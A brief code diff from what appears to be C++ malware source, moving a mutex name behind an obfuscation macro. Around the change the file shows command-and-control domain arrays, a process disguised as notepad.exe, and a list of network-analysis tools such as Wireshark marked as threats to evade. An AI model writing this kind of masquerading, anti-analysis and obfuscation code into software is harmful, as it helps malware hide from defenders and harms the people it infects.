@@ -5,6 +5,8 @@ const std::string CNC_DOMAINS[] = {
 };
 
 #define PROCESS_NAME OBFUSCATE("notepad.exe")
+#define MUTEX_NAME OBFUSCATE("identity_mutex")
+
 
 const std::string THREAT_PROCESSES[] = {
 	std::string(OBFUSCATE("wireshark.exe")),
@@ -12,7 +14,6 @@ const std::string THREAT_PROCESSES[] = {
 	std::string(OBFUSCATE("tshark.exe")),
 	std::string(OBFUSCATE("netcap.exe"))
 };
-const char* MUTEX_NAME = "identity_mutex";
 
 const size_t SLEEP_BETWEEN_COMMANDS = 10;
 
